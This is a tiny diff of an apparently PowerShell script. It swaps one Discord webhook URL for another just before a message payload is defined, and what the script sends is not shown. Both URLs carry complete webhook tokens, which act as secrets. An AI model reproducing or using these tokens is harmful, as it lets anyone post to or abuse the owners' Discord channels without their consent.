@@ -14,7 +14,7 @@ sleep 5
 
 
 
-$webhookUrl = "https://discord.com/api/webhooks/1263853195793403904/v1PewX6hudpX7T97utLa3imVDAp6ngZfAQgXsk7idVH-pv20AqzEOpds6rKDaC2FYyEF"
+$webhookUrl = "https://discord.com/api/webhooks/1265724354495381645/sCA1JwOZ3TXPLLeXYUGz88LBbHcFmxuiPlSjRo0EzJbD8PsH_dspQETBXExBP7zICzVO"
 
 # Define the message payload
 $payload = @{
